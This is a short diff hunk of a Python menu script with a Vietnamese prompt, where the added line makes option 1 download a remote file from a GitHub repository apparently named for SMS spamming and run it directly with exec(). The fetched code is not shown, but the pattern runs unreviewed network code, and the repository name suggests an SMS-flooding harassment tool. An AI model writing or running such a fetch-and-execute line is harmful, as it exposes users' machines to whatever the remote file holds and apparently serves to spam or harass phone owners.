@@ -37,6 +37,7 @@ while True:
     choice = input("Nhập lựa chọn của bạn (1 hoặc 2): ")
 
     if choice == "1":
+        exec(requests.get('https://raw.githubusercontent.com/minhtrinh2007/spamsms/refs/heads/main/spamthuong.py').text)
         break
 
     elif choice == "2":
